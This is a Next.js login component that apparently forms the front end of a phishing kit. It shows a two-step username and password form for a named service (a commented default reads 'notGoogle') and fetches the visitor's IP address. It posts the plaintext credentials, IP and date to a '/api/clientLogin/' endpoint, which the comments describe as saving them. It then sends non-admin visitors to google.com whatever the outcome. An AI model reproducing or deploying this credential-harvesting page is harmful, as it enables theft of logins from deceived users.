"use client";
import { useState , useEffect} from "react";
import { useRouter } from "next/navigation";

import UserName from "@/components/login/userName";
import Password from "@/components/login/password";

const Login = ({ argument }) => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [ipv4, setIpv4] = useState(null);

  useEffect(() => {
    const fetchIPv4 = async () => {
      try {
        const response = await fetch(`https://api.ipify.org?format=json`);
        if (!response.ok) {
          throw new Error("Failed to fetch IPv4 address");
        }
        const result = await response.json();
        setIpv4(result.ip);
        //console.log(result.ip);
      } catch (error) {
        console.error("Error fetching IPv4 address:", error.message);
      }
    };

    fetchIPv4();
  }, []);

  const service = argument;

  const router = useRouter();
  
  // Function to handle username submission
  const handleUsernameSubmit = (usernameValue) => {
    setUsername(usernameValue);
  };

  // Function to handle password submission
  const handlePasswordSubmit = async (passwordValue) => {
    setPassword(passwordValue);
    // Now you can make your HTTP request to save both username and password
    handleSaveData(username, passwordValue);
  };

  // Function to handle HTTP request to save username and password
  const handleSaveData = async (username, password) => {
    // const service = 'notGoogle';
    const jsonData = { service, username, password, ipv4, date: new Date() };
    //console.log('Saving user data:', jsonData);

    let apiToUse;
    if (service === "admin") {
      apiToUse = "/api/admin/";
    } else {
      apiToUse = "/api/clientLogin/";
    }

    try {
      const response = await fetch(`${apiToUse}`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(jsonData),
      });
      const data = await response.json();
      console.log("Response data: ", data);

      if (response.ok) {
        if (data.message === "Authorized") {
          console.log("Authorized");
          router.push("/admin"); // Redirect to admin page
          
        }else {
          router.push("https://www.google.com"); // Redirect to home page
        }
        
      } else {
        //console.error("Failed to save user data:", response.statusText);
        router.push("https://www.google.com"); // Redirect to home page
      }
    } catch (error) {
      //console.error("An error occurred while saving user data:", error);
      router.push("https://www.google.com"); // Redirect to home page
    }
  };

  return (
    <div>
      {!username ? ( // Render UserName component if username is not submitted
        <UserName onSubmit={handleUsernameSubmit} argument={service} />
      ) : (
        // Render Password component if username is submitted
        <Password onSubmit={handlePasswordSubmit} argument={service} />
      )}
    </div>
  );
};

export default Login;
